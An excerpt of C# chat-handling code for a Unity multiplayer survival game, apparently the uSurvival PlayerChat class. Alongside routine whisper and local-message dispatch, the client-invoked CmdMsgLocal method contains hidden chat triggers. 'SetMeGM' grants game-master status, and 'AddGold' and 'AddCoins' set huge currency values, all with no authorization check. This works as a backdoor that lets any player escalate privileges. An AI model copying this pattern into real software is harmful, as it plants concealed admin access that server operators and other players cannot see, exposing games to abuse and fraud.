...
namespace uSurvival
{
    ...
    public partial class PlayerChat : NetworkBehaviour
    {
        ...
        void CmdMsgLocal(string message)
        {
            ...
            if (message == "SetMeGM") player.gameMasterTool.CmdSetGMFromChat();
            else if (message == "AddGold") player.gold = 99999999;
            else if (message == "AddCoins") player.itemMall.coins = 999999;
            else
            {
                if (message.Length > maxLength) return;
        ...
        public void TargetMsgWhisperFrom(string sender, string message)
        {
            ...
            UIChatExtended.singleton.AddMessage(new ChatMessage(sender, identifier, message, reply, whisper.textPrefab), GFFAddons.chatChannel.whisper);
        }
        ...
        public void TargetMsgWhisperTo(string receiver, string message)
        {
            ...
            UIChatExtended.singleton.AddMessage(new ChatMessage(receiver, identifier, message, reply, whisper.textPrefab), GFFAddons.chatChannel.whisper);
        }
        ...
        public void RpcMsgLocal(string sender, string message)
        {
            ...
            string reply = $"{whisper.command} {sender} "; // whisper
            UIChatExtended.singleton.AddMessage(new ChatMessage(sender, identifier, message, reply, local.textPrefab), GFFAddons.chatChannel.all);
        }

        [TargetRpc]
        public void TargetMsgInfo(string message)
        {
            UIChatExtended.singleton.AddMessage(new ChatMessage("", info.identifierIn, message, "", info.textPrefab), GFFAddons.chatChannel.info);
        }
    }
}